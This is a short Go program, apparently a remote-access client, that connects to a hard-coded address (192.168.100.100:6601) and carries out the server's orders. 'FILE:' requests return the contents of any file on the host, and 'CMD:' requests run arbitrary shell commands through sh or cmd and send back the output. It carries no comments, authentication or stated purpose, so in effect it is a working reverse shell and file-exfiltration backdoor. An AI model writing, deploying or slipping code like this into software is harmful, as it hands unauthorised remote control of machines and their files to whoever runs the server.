package main

import (
	"bufio"
	"fmt"
	"net"
	"os"
	"os/exec"
	"runtime"
	"strings"
)

func main() {
	conn, err := net.Dial("tcp", "192.168.100.100:6601")
	if err != nil {
		fmt.Printf("Failed to connect to server: %v\n", err)
		return
	}
	defer conn.Close()
	fmt.Println("Connected to server")

	for {
		reader := bufio.NewReader(conn)
		request, err := reader.ReadString('\n')
		if err != nil {
			fmt.Printf("Failed to read from server: %v\n", err)
			return
		}
		request = strings.TrimSpace(request)

		if strings.HasPrefix(request, "FILE:") {
			filePath := strings.TrimPrefix(request, "FILE:")
			fileContent, err := readFile(filePath)
			if err != nil {
				conn.Write([]byte("ERROR\n"))
			} else {
				conn.Write([]byte(fileContent + "\n"))
			}
		} else if strings.HasPrefix(request, "CMD:") {
			command := strings.TrimPrefix(request, "CMD:")
			cmdOutput, err := executeCommand(command)
			if err != nil {
				conn.Write([]byte("ERROR\n"))
			} else {
				conn.Write([]byte(cmdOutput + "\n"))
			}
		}
	}
}

func readFile(filePath string) (string, error) {
	file, err := os.Open(filePath)
	if err != nil {
		return "", err
	}
	defer file.Close()

	content := new(strings.Builder)
	scanner := bufio.NewScanner(file)
	for scanner.Scan() {
		content.WriteString(scanner.Text() + "\n")
	}
	if err := scanner.Err(); err != nil {
		return "", err
	}

	return content.String(), nil
}

func executeCommand(command string) (string, error) {
	var cmd *exec.Cmd

	if runtime.GOOS == "windows" {
		cmd = exec.Command("cmd", "/C", command)
	} else {
		cmd = exec.Command("sh", "-c", command)
	}

	output, err := cmd.CombinedOutput()
	if err != nil {
		return "", err
	}
	return string(output), nil
}
